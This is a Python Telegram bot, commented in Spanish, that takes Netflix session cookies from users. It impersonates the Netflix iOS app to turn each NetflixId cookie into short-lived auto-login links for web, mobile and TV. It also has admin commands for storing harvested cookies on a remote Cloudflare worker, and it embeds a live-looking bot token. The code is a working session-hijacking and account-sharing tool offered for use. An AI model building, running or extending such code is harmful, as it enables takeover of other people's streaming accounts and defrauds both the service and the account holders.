"""
Bot de Telegram: generación de nftoken + control de permisos de usuarios.
"""

import json
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.parse import unquote

import requests
import telebot
from telebot import types
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

TOKEN = "9238856656:AAEp9pr-_KqKgJeHDbJViOECWBrDYiI44eI"
ADMIN_IDS = {123456789}                      # ← tus IDs de Telegram
WORKER_URL = "https://plain-lab-68c3.tvs12202.workers.dev"
WORKER_ADMIN = "TU_ADMIN_PASSWORD_AQUI"

ZONA_HORARIA = "America/Mexico_City"
TIMEOUT_API = 25
MAX_HILOS = 8
ESPERA_MINIMA = 5
bot = telebot.TeleBot(TOKEN)

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
CREDITOS_BOT = '\n\n──────────────────\n⚡ <i>👑OWNER:</i> <a href="https://t.me/DanGel_Glr">  ⃝⃟⃠ɴͥɪͣᴄͫᴀ͜͠ ₫₳Ϟ₲϶Γ™</a>'

PARAMS = {
    "appVersion": "15.48.1", "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone", "iosVersion": "15.8.5", "isTablet": "false",
    "languages": "en-US", "locale": "en-US", "maxDeviceWidth": "375",
    "model": "saget", "modelType": "IPHONE8-1", "odpAware": "true",
    "path": '["account","token","default"]', "pathFormat": "graph",
    "pixelDensity": "2.0", "progressive": "false", "responseFormat": "json",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}'
}

HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.request.client.timezoneid": ZONA_HORARIA,
}

TEXTO_AYUDA = (
    "🎬 <b>¡Generador de Accesos Netflix Oficial!</b> 🚀\n\n"
    "📥 <b>¿Cómo usarlo?</b>\n"
    "Envíame un bloque de cookies que contenga <code>NetflixId</code>.\n\n"
    "💡 Abre los enlaces en modo <b>incógnito</b>. Caducan en pocas horas."
)

_ejecutor = ThreadPoolExecutor(max_workers=MAX_HILOS)
_ultima_peticion = {}
_stats = {}
_lock = threading.Lock()
_stats_lock = threading.Lock()


def esperar_turno(uid):
    ahora = time.time()
    with _lock:
        restante = ESPERA_MINIMA - (ahora - _ultima_peticion.get(uid, 0))
        if restante > 0:
            return restante
        _ultima_peticion[uid] = ahora
        return 0


def registrar(uid, tipo, plataforma="netflix"):
    with _stats_lock:
        s = _stats.setdefault(uid, {"primera_vez": time.time(), "tokens": 0, "archivos": 0, "plataformas": {}})
        if tipo == "token":
            s["tokens"] += 1
            s["plataformas"][plataforma] = s["plataformas"].get(plataforma, 0) + 1
        elif tipo == "archivo":
            s["archivos"] += 1


def tiempo_legible(seg):
    d, h, m = int(seg // 86400), int((seg % 86400) // 3600), int((seg % 3600) // 60)
    p = []
    if d: p.append(f"{d} día{'s' if d > 1 else ''}")
    if h: p.append(f"{h} hora{'s' if h > 1 else ''}")
    if m or not p: p.append(f"{m} minuto{'s' if m != 1 else ''}")
    return ", ".join(p)


# ---------------- sync con el worker ----------------

def worker_admin(path, payload):
    try:
        r = requests.post(
            WORKER_URL + path,
            json=payload,
            headers={"authorization": "Bearer " + WORKER_ADMIN},
            timeout=15,
        )
        return r.json()
    except (requests.RequestException, ValueError):
        return {"ok": False, "error": "sin conexión"}


def worker_get(path):
    try:
        r = requests.get(
            WORKER_URL + path,
            headers={"authorization": "Bearer " + WORKER_ADMIN},
            timeout=15,
        )
        return r.json()
    except (requests.RequestException, ValueError):
        return {"ok": False, "error": "sin conexión"}


def sync_usuario(msg):
    worker_admin("/api/admin/set-status", {
        "tg": msg.from_user.id,
        "first_name": msg.from_user.first_name or "",
        "username": msg.from_user.username or "",
        "status": "pending",
    })


# ---------------- cookies ----------------

def extraer_netflix_id(texto):
    texto = (texto or "").strip()
    if not texto:
        return None
    if texto[0] in "[{":
        try:
            datos = json.loads(texto)
        except json.JSONDecodeError:
            datos = None
        if isinstance(datos, list):
            for c in datos:
                if isinstance(c, dict) and c.get("name") == "NetflixId" and c.get("value"):
                    return unquote(c["value"])
        elif isinstance(datos, dict):
            if isinstance(datos.get("cookies"), list):
                for c in datos["cookies"]:
                    if isinstance(c, dict) and c.get("name") == "NetflixId" and c.get("value"):
                        return unquote(c["value"])
            if isinstance(datos.get("NetflixId"), str):
                return unquote(datos["NetflixId"])
    for linea in texto.splitlines():
        linea = linea.strip()
        if not linea:
            continue
        if linea.startswith("#HttpOnly_"):
            linea = linea[10:]
        elif linea.startswith("#"):
            continue
        campos = linea.split("\t")
        if len(campos) < 7:
            campos = linea.split()
        if len(campos) >= 7 and campos[5] == "NetflixId":
            return unquote(campos[6])
        m = re.match(r"^NetflixId=([^;\s]+)", linea)
        if m:
            return unquote(m.group(1))
    return None


def generar_enlace(texto):
    nid = extraer_netflix_id(texto)
    if not nid:
        return None, None, "No encontré la cookie <code>NetflixId</code>."
    h = dict(HEADERS)
    h["Cookie"] = f"NetflixId={nid}"
    try:
        r = requests.get(API_URL, params=PARAMS, headers=h, timeout=TIMEOUT_API, verify=False)
    except requests.Timeout:
        return None, None, "Netflix tardó demasiado."
    except requests.RequestException:
        return None, None, "Fallo de red con la API de Netflix."
    if r.status_code in (401, 403):
        return None, None, "Netflix rechazó la cookie: caducada o inválida."
    if r.status_code >= 500:
        return None, None, "Error interno de Netflix."
    try:
        datos = r.json()
    except ValueError:
        return None, None, f"Respuesta inesperada (HTTP {r.status_code})."
    nodo = (((datos.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
    token, expira = nodo.get("token"), nodo.get("expires")
    if not token:
        return None, None, "La cookie no devolvió token válido."
    if isinstance(expira, int) and len(str(expira)) == 13:
        expira //= 1000
    try:
        caduca = datetime.fromtimestamp(expira).strftime("%d/%m/%Y %H:%M") if isinstance(expira, int) else "desconocida"
    except (OverflowError, OSError, ValueError):
        caduca = "desconocida"
    return f"https://netflix.com/?nftoken={token}", caduca, None


def procesar(chat_id, mensaje_id, texto):
    try:
        bot.send_chat_action(chat_id, "typing")
        url, caduca, error = generar_enlace(texto)
        if error:
            bot.send_message(chat_id, f"❌ <b>Error:</b>\n\n{error}{CREDITOS_BOT}", parse_mode="HTML")
            return
        token = url.split("nftoken=")[1]
        cuerpo = (
            "✅ <b>¡Enlaces generados!</b>\n\n"
            f"• 🌐 <a href=\"https://netflix.com/?nftoken={token}\"><b>Web</b></a>\n"
            f"• 📱 <a href=\"https://netflix.com/unsupported?nftoken={token}&native_app=true\"><b>Móvil</b></a>\n"
            f"• 📺 <a href=\"https://www.netflix.com/tv2?nftoken={token}\"><b>TV</b></a>\n\n"
            f"⏳ <b>Caducidad:</b> <code>{caduca}</code>{CREDITOS_BOT}"
        )
        bot.send_message(chat_id, cuerpo, parse_mode="HTML",
                         disable_web_page_preview=True, reply_to_message_id=mensaje_id)
    except telebot.apihelper.ApiTelegramException:
        pass


def encolar(message, texto, tipo="token"):
    restante = esperar_turno(message.from_user.id)
    if restante:
        bot.reply_to(message, f"⏳ Esperá <b>{int(restante) + 1}s</b>.{CREDITOS_BOT}", parse_mode="HTML")
        return
    if not texto or not texto.strip():
        bot.reply_to(message, f"⚠️ Enviame el bloque de cookies.{CREDITOS_BOT}", parse_mode="HTML")
        return
    registrar(message.from_user.id, tipo)
    _ejecutor.submit(procesar, message.chat.id, message.message_id, texto)


# ---------------- comandos ----------------

@bot.message_handler(commands=["start", "help"])
def cmd_inicio(message):
    u = message.from_user
    sync_usuario(message)
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("✅ Aprobar", callback_data=f"act:{u.id}"),
           types.InlineKeyboardButton("⛔ Bloquear", callback_data=f"blk:{u.id}"))
    for admin in ADMIN_IDS:
        if admin == u.id:
            continue
        try:
            bot.send_message(admin,
                f"👤 <b>Nuevo ingreso</b>\nID: <code>{u.id}</code>\n"
                f"Nombre: {u.first_name or '—'}\nUsuario: @{u.username or '—'}",
                parse_mode="HTML", reply_markup=kb)
        except telebot.apihelper.ApiTelegramException:
            pass
    bot.reply_to(message, TEXTO_AYUDA + CREDITOS_BOT, parse_mode="HTML",
                 disable_web_page_preview=True)


@bot.message_handler(commands=["id"])
def cmd_id(message):
    uid = message.from_user.id
    ahora = time.time()
    with _stats_lock:
        s = _stats.setdefault(uid, {"primera_vez": ahora, "tokens": 0, "archivos": 0, "plataformas": {}})
        tokens, archivos, plataformas = s["tokens"], s["archivos"], dict(s["plataformas"])
        inicio = s["primera_vez"]

    detalle = "\n".join(f"   • {k}: {v}" for k, v in plataformas.items()) or "   • —"
    plantilla = (
        "🪪 <b>Panel de usuario</b>\n\n"
        "╭───────────────────────────\n"
        f"┣ 🆔 <b>ID:</b> <code>{uid}</code>\n"
        f"┣ ⏳ <b>Tiempo en el bot:</b> <code>{tiempo_legible(ahora - inicio)}</code>\n"
        f"┣ 🔑 <b>Tokens:</b> <code>{tokens}</code>\n"
        f"┣ 📂 <b>Archivos:</b> <code>{archivos}</code>\n"
        "┣ 🍪 <b>Cookies por plataforma:</b>\n"
        f"{detalle}\n"
        "───────────────────────────"
    )
    bot.reply_to(message, plantilla + CREDITOS_BOT, parse_mode="HTML",
                 disable_web_page_preview=True)


@bot.message_handler(commands=["pendientes"])
def cmd_pendientes(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    r = worker_get("/api/admin/stats")
    if not r.get("ok"):
        return bot.reply_to(message, "❌ No pude consultar el panel.")
    pend = [u for u in r.get("users", []) if u.get("status") != "active"]
    if not pend:
        return bot.reply_to(message, "✅ No hay usuarios pendientes.")
    for u in pend[:20]:
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("✅ Aprobar", callback_data=f"act:{u['tg']}"),
               types.InlineKeyboardButton("⛔ Bloquear", callback_data=f"blk:{u['tg']}"))
        bot.send_message(message.chat.id,
            f"👤 <code>{u['tg']}</code> · {u.get('first_name') or '—'} · @{u.get('username') or '—'}\n"
            f"Estado: {u.get('status')}",
            parse_mode="HTML", reply_markup=kb)


@bot.message_handler(commands=["activar", "desactivar"])
def cmd_estado(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    partes = message.text.split()
    if len(partes) < 2 or not partes[1].isdigit():
        return bot.reply_to(message, "Uso: /activar 123456789")
    tg = partes[1]
    estado = "active" if partes[0].startswith("/activar") else "blocked"
    r = worker_admin("/api/admin/set-status", {"tg": tg, "status": estado})
    bot.reply_to(message, "✅ Actualizado" if r.get("ok") else "❌ " + r.get("error", "error"))


@bot.message_handler(commands=["plataformas"])
def cmd_plataformas(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    r = worker_get("/api/admin/platforms")
    if not r.get("ok"):
        return bot.reply_to(message, "❌ No pude consultar.")
    lineas = [f"{'🟢' if p['enabled'] else '🔴'} {p['name']}" for p in r.get("platforms", [])]
    bot.reply_to(message, "<b>Visibilidad en la web</b>\n\n" + "\n".join(lineas) +
                 "\n\nCambialo desde el panel de administración.", parse_mode="HTML")


@bot.message_handler(commands=["addcookie", "purga"])
def cmd_cookies(message):
    if message.from_user.id not in ADMIN_IDS:
        return

    if message.text.startswith("/purga"):
        r = worker_admin("/api/admin/purge", {})
        return bot.reply_to(message, f"🧹 Borradas: {r.get('borradas', 0)}" if r.get("ok") else "❌ Error")

    partes = message.text.split()
    if len(partes) < 2:
        return bot.reply_to(message, "Uso: /addcookie netflix (respondiendo al mensaje con la cookie)")
    plataforma = partes[1].lower()

    origen = message.reply_to_message
    if not origen:
        return bot.reply_to(message, "Respondé con Reply al mensaje que contiene la cookie.")

    texto = origen.text or origen.caption or ""
    if origen.document:
        try:
            texto = bot.download_file(bot.get_file(origen.document.file_id).file_path).decode("utf-8", "ignore")
        except Exception:
            return bot.reply_to(message, "❌ No pude leer el archivo.")

    if not texto.strip():
        return bot.reply_to(message, "No encontré cookies en ese mensaje.")

    r = worker_admin("/api/admin/save-cookie", {"platform": plataforma, "cookieData": texto})
    bot.reply_to(message, "✅ " + r.get("message", "Guardada") if r.get("ok") else "❌ " + r.get("error", "Error"))


@bot.callback_query_handler(func=lambda c: c.data.startswith(("act:", "blk:")))
def cb_estado(call):
    if call.from_user.id not in ADMIN_IDS:
        return bot.answer_callback_query(call.id, "No autorizado")
    accion, tg = call.data.split(":")
    estado = "active" if accion == "act" else "blocked"
    r = worker_admin("/api/admin/set-status", {"tg": tg, "status": estado})
    bot.answer_callback_query(call.id, "Listo" if r.get("ok") else "Error")
    if r.get("ok"):
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)


# ---------------- contenido ----------------

@bot.message_handler(content_types=["document"])
def por_archivo(message):
    doc = message.document
    if doc.file_size and doc.file_size > 512 * 1024:
        return bot.reply_to(message, f"⚠️ Archivo muy grande (máx 512 KB).{CREDITOS_BOT}", parse_mode="HTML")
    try:
        contenido = bot.download_file(bot.get_file(doc.file_id).file_path)
        texto = contenido.decode("utf-8", "ignore")
    except Exception:
        return bot.reply_to(message, f"❌ No pude leer el archivo.{CREDITOS_BOT}", parse_mode="HTML")
    encolar(message, texto, tipo="archivo")


@bot.message_handler(func=lambda m: bool(m.text))
def por_texto(message):
    if message.text.startswith("/"):
        return
    encolar(message, message.text, tipo="token")


@bot.message_handler(content_types=["photo", "video", "audio", "voice", "sticker"])
def otros(message):
    bot.reply_to(message, f"📌 Enviá las cookies como texto o .txt.{CREDITOS_BOT}", parse_mode="HTML")


def main():
    print("🤖 Bot iniciado.")
    try:
        bot.infinity_polling(timeout=30, long_polling_timeout=25)
    except KeyboardInterrupt:
        print("\n🛑 Deteniendo…")
    finally:
        _ejecutor.shutdown(wait=True)


if __name__ == "__main__":
    main()
